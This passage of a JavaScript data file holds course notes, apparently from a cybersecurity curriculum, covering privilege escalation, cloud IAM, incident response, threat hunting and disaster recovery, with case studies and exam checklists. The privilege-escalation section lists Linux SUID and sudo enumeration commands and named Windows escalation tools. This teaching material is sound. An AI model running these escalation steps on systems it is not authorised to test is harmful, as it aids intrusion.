      'Explain how the `HttpOnly` cookie flag mitigates session hijacking via XSS.',
      'Explain how CSRF tokens protect state-changing requests.'
    ],
    memoryMnemonics: [
      'SQLi targets the Database; XSS targets the Client Browser.'
    ]
  },

  'sec301-w4': {
    topicSummary: 'Privilege escalation techniques (Linux SUID / sudo, Windows token impersonation), lateral movement (Pass-the-Hash), and professional pentest report authoring.',
    detailedSections: [
      {
        heading: '1. Privilege Escalation Mechanisms',
        subheading: 'Vertical vs. Horizontal Escalation on Linux and Windows',
        content: 'Once initial low-privilege access is obtained, attackers elevate permissions to Root (Linux) or NT AUTHORITY\\SYSTEM (Windows).',
        bulletPoints: [
          'Horizontal Escalation: Gaining access to resources belonging to a peer user with equivalent privilege levels (e.g. User A accessing User B’s bank statement via IDOR).',
          'Vertical Escalation: Elevating from a low-privilege service account to Superuser/Root/Domain Admin.',
          'Linux Vectors: Misconfigured SUID binaries (`find / -perm -u=s -type f 2>/dev/null`), overly permissive `sudoers` rules (`sudo -l`), writable cron jobs, unpatched kernel exploits (Dirty COW).',
          'Windows Vectors: Unquoted service paths, AlwaysInstallElevated registry keys, SeImpersonatePrivilege abuse (JuicyPotato/PrintSpoofer), stored cleartext credentials in LSASS memory.'
        ],
        codeOrCommand: 'Linux Privilege Check:\nsudo -l\nfind / -perm -4000 2>/dev/null\nuname -a\n\nWindows Privilege Check:\nwhoami /priv\nwhoami /groups\nnet user %username%'
      },
      {
        heading: '2. Professional Penetration Test Reporting',
        subheading: 'Executive Summary, Technical Findings, and Remediation Roadmaps',
        content: 'The written report is the primary deliverable of an ethical hacking engagement.',
        bulletPoints: [
          'Executive Summary: High-level non-technical risk overview for C-level executives and board members explaining business impact.',
          'Detailed Technical Findings: Complete Step-by-step Proof-of-Concept (PoC) reproductions, CVSS vectors, affected assets, and actionable code-level remediation recommendations.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2021 Colonial Pipeline Ransomware & Credential Reuse',
      year: '2021',
      target: 'Colonial Pipeline (Largest fuel pipeline in the US)',
      attackVector: 'Single compromised legacy VPN account without MFA enabled (password discovered in dark web breach dump).',
      impact: 'Pipeline shutdown for 6 days, gas shortages across the US East Coast, $4.4 million ransom paid in Bitcoin.',
      lessonLearned: 'Enforce MFA universally on all external VPN entry points, decommission legacy unused service accounts.'
    },
    examCramChecklist: [
      'Distinguish between Vertical Privilege Escalation (Low user to Admin) and Horizontal Privilege Escalation (User A to User B).',
      'Explain how unquoted service paths in Windows allow local binary hijacking.',
      'State the two primary sections of a professional penetration test report (Executive Summary and Technical Findings).'
    ],
    memoryMnemonics: [
      'Vertical = Up to Root. Horizontal = Sideways to Neighbor.'
    ]
  },

  // =========================================================================
  // LEVEL 4: CLOUD & INCIDENT RESPONSE (SEC-401)
  // =========================================================================
  'sec401-w1': {
    topicSummary: 'Cloud computing security architectures, AWS/Azure Shared Responsibility Model, Identity and Access Management (IAM), and CloudTrail telemetry auditing.',
    detailedSections: [
      {
        heading: '1. The Cloud Shared Responsibility Model',
        subheading: 'Demarcation of Security Duties: Cloud Provider vs. Customer',
        content: 'Security in the cloud is a shared responsibility between the Cloud Service Provider (CSP) and the customer.',
        bulletPoints: [
          'IaaS (Infrastructure as a Service - AWS EC2): CSP secures physical hardware, data center facilities, and hypervisor; Customer secures OS, patches, middleware, network firewall (Security Groups), IAM, and data.',
          'PaaS (Platform as a Service - AWS Elastic Beanstalk, Heroku): CSP secures hardware, OS, runtime environment; Customer secures application code and data configurations.',
          'SaaS (Software as a Service - Microsoft 365, Google Workspace): CSP secures entire stack including application; Customer secures user identity, access policies, and data classification.'
        ]
      },
      {
        heading: '2. Cloud IAM & Least Privilege Governance',
        subheading: 'Roles, Policies, Service Principals & Metadata Safeguards',
        content: 'Identity is the new perimeter in cloud security architectures.',
        bulletPoints: [
          'Least Privilege IAM: Avoid assigning wildcard `*` permissions in JSON policies; grant granular action permissions.',
          'AWS IAM Roles & Temporary STS Tokens: Always use IAM Roles rather than hardcoding static Access Key IDs into application source code.',
          'IMDSv2 (Instance Metadata Service v2): Requires session token headers to query `http://169.254.169.254/latest/meta-data/`, preventing SSRF credential theft.'
        ],
        codeOrCommand: 'AWS S3 Secure Bucket Policy Snippet (Deny Unencrypted Uploads):\n{\n  "Effect": "Deny",\n  "Principal": "*",\n  "Action": "s3:PutObject",\n  "Resource": "arn:aws:s3:::company-data/*",\n  "Condition": {\n    "StringNotEquals": {\n      "s3:x-amz-server-side-encryption": "aws:kms"\n    }\n  }\n}'
      }
    ],
    realWorldCaseStudy: {
      title: '2023 Microsoft Storm-0558 Cloud Inactive Key Forgery',
      year: '2023',
      target: 'US State Department & 25 Government Cloud Exchange Portals',
      attackVector: 'Chinese APT Storm-0558 acquired an inactive Microsoft consumer signing key to forge OpenID authentication tokens (JWT) granting full Exchange Online access.',
      impact: 'Hundreds of thousands of top-level diplomatic emails intercepted.',
      lessonLearned: 'Enforce automatic cryptographic signing key rotation and expand detailed cloud security audit logging at no extra licensing tier.'
    },
    examCramChecklist: [
      'Differentiate responsibilities across IaaS, PaaS, and SaaS models.',
      'Explain why hardcoding cloud access keys in Git repositories is dangerous and how IAM Roles solve it.',
      'Explain how IMDSv2 defeats SSRF attacks against cloud virtual machines.'
    ],
    memoryMnemonics: [
      'SaaS: Customer controls Data & Access. IaaS: Customer controls everything from OS up.'
    ]
  },

  'sec401-w2': {
    topicSummary: 'NIST SP 800-61 Incident Handling lifecycle, containment strategies, digital forensics, live memory capture, and legal chain of custody.',
    detailedSections: [
      {
        heading: '1. NIST SP 800-61 Rev 2 Incident Response Stages',
        subheading: 'The 4-Phase Universal Incident Response Framework',
        content: 'Structured incident handling minimizes downtime and preserves forensic evidence.',
        bulletPoints: [
          'Phase 1: Preparation (Creating IR policies, establishing call trees, equipping forensics toolkits, baseline logging, tabletop exercises).',
          'Phase 2: Detection & Analysis (Triaging SIEM alerts, determining Indicators of Compromise [IoCs], scoping breach magnitude).',
          'Phase 3: Containment, Eradication & Recovery (Short-term network isolation, revoking compromised API keys, wiping malware/backdoors, restoring clean systems from validated air-gapped backups).',
          'Phase 4: Post-Incident Activity / Lessons Learned (Conducting post-mortem review within 2 weeks, updating security playbooks, generating root-cause report).'
        ]
      },
      {
        heading: '2. Digital Forensics & Order of Volatility',
        subheading: 'RFC 3227 Rules for Preserving Ephemeral Digital Evidence',
        content: 'Forensic investigators must collect evidence in order of most volatile to least volatile to avoid losing RAM data.',
        bulletPoints: [
          'Order of Volatility: 1. CPU Registers and Cache → 2. Routing tables, ARP cache, process table, RAM → 3. Temporary file systems → 4. Hard disk / SSD storage → 5. Remote logging data → 6. Physical topology and backup tapes.',
          'Chain of Custody: Detailed chronological audit log recording who collected the evidence, exact timestamp, cryptographic hashes (SHA-256 before and after acquisition), and secure storage location.',
          'Write Blockers: Hardware devices preventing any write modifications to storage media during forensic bit-stream imaging.'
        ],
        codeOrCommand: 'Forensic Hash Verification:\nsha256sum evidence_drive.dd > hash_baseline.txt\n# Verify image integrity:\nsha256sum -c hash_baseline.txt'
      }
    ],
    realWorldCaseStudy: {
      title: '2021 Kaseya VSA Ransomware Supply-Chain Incident',
      year: '2021',
      target: 'Kaseya Managed Service Providers & 1,500 downstream businesses',
      attackVector: 'REvil ransomware gang exploited zero-day authentication bypass vulnerabilities in Kaseya VSA remote management software.',
      impact: 'Massive coordinated ransomware deployment demanding $70 million ransom.',
      lessonLearned: 'Immediate emergency SaaS server isolation, coordinated patch deployment, and FBI cryptographic key recovery collaboration.'
    },
    examCramChecklist: [
      'Name all 4 NIST SP 800-61 Incident Response phases in order.',
      'Explain the Order of Volatility (RFC 3227) from CPU/RAM to Hard Disks.',
      'Explain why hardware write-blockers and SHA-256 hash preservation are required for forensic evidence admissibility in court.'
    ],
    memoryMnemonics: [
      'NIST IR: Prep, Detect/Analyze, Contain/Eradicate/Recover, Post-Incident Lessons.'
    ]
  },

  'sec401-w3': {
    topicSummary: 'Threat hunting methodologies, MITRE ATT&CK Matrix TTPs, SIEM correlation engines (Splunk, Elastic), and Indicators of Compromise (IoCs vs IoAs).',
    detailedSections: [
      {
        heading: '1. MITRE ATT&CK Framework & Threat Hunting',
        subheading: 'Tactics, Techniques, and Procedures (TTPs)',
        content: 'MITRE ATT&CK provides a comprehensive globally-accessible knowledge base of adversary behaviors based on real-world observations.',
        bulletPoints: [
          'Tactics (The "Why"): Adversary’s tactical objective (e.g., Initial Access, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement, Exfiltration).',
          'Techniques (The "How"): Specific actions taken to achieve the tactic (e.g., T1059 Command and Scripting Interpreter: PowerShell).',
          'Indicators of Compromise (IoCs) vs. Indicators of Attack (IoAs): IoCs represent reactive evidence of past compromise (file hashes, known malicious IP addresses). IoAs represent proactive intent and live behavioral anomalies (abnormal living-off-the-land binary execution).'
        ]
      },
      {
        heading: '2. SIEM Log Correlation & SOC Triage',
        subheading: 'Security Information and Event Management in Practice',
        content: 'SIEM platforms aggregate, normalize, and correlate logs from firewalls, servers, and endpoint agents.',
        bulletPoints: [
          'Correlation Rules: Triggering high-priority alerts when multiple correlated events occur in sequence (e.g., 5 failed SSH logins followed by 1 successful login followed by `sudo su` within 60 seconds).',
          'SOAR (Security Orchestration, Automation, and Response): Automating repetitive response actions (e.g. automatically quarantining a host and blocking an IP upon verified malware trigger).'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2023 MGM Resorts Ransomware & Okta Help Desk Vishing',
      year: '2023',
      target: 'MGM Resorts International (Las Vegas casinos & hotels)',
      attackVector: 'ALPHV/Scattered Spider social engineered the IT help desk via a 10-minute LinkedIn-informed phone call to reset an administrator MFA token.',
      impact: '$100 million revenue loss, hotel key cards and slot machines disabled for days.',
      lessonLearned: 'Mandatory in-person or cryptographically verified identity checks for help desk password and MFA resets.'
    },
    examCramChecklist: [
      'Differentiate between Tactics (Goals) and Techniques (Actions) in MITRE ATT&CK.',
      'Explain the difference between reactive IoCs (hashes, IPs) and proactive IoAs (behavioral patterns).',
      'Explain how SIEM correlation rules detect distributed brute-force attacks.'
    ],
    memoryMnemonics: [
      'Tactics = Goals (Why). Techniques = Methods (How). Procedures = Specific Execution (What).'
    ]
  },

  'sec401-w4': {
    topicSummary: 'Business Continuity (BC) and Disaster Recovery (DR), RTO & RPO metrics, Site resilience strategies, and comprehensive Capstone defense mastery.',
    detailedSections: [
      {
        heading: '1. Business Continuity & Disaster Recovery Metrics',
        subheading: 'RTO, RPO, MTBF, MTTR, and High-Availability Engineering',
        content: 'BC/DR frameworks ensure organizational survival following catastrophic outages, natural disasters, or major cyber attacks.',
        bulletPoints: [
          'RTO (Recovery Time Objective): Maximum acceptable duration of system downtime before unacceptable business loss occurs ("How long can we be offline?").',
          'RPO (Recovery Point Objective): Maximum acceptable amount of data loss measured in time ("How much data can we afford to lose since the last backup?").',
          'MTBF (Mean Time Between Failures): Metric of system reliability. MTTR (Mean Time to Repair): Speed of resolving outages.'
        ]
      },
      {
        heading: '2. Recovery Site Strategies & Capstone Synthesis',
        subheading: 'Hot Site vs. Warm Site vs. Cold Site',
        content: 'Organizations maintain alternate physical and cloud facilities for failover.',
        bulletPoints: [
          'Hot Site: Fully operational, mirrored duplicate facility with real-time synchronized data; near-instantaneous failover ($RTO \\approx 0$). Most expensive.',
          'Warm Site: Equipped with hardware and network connectivity, but requires loading recent data backups before becoming operational ($RTO$ = hours to days).',
          'Cold Site: Facility with basic power and cooling, but no pre-installed hardware or active data ($RTO$ = weeks). Lowest cost.',
          'Cloud Multi-Region Active-Active: Modern serverless infrastructure utilizing cross-region database replication (AWS Aurora Global Database) for zero-downtime automated failover.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2020 Cloudflare Global BGP Routing Outage Resilience',
      year: '2020',
      target: 'Cloudflare Global Edge Network',
      attackVector: 'A router configuration error leaked bad BGP routes, causing an immediate drop in global traffic.',
      impact: 'Automated health check probes and multi-datacenter Anycast rerouting restored 100% of global traffic within 27 minutes.',
      lessonLearned: 'Automated failover, Anycast routing, and decoupled control planes enable rapid disaster recovery.'
    },
    examCramChecklist: [
      'Define RTO (Maximum downtime allowed) and RPO (Maximum data loss allowed).',
      'Compare Hot Sites (instant failover, expensive), Warm Sites (hours, moderate), and Cold Sites (weeks, basic shell).',
      'Explain how cloud multi-region replication minimizes both RTO and RPO to near zero.'
    ],
    memoryMnemonics: [
      'RTO = Clock / Time. RPO = Data / Points in History.'
    ]
  }
};
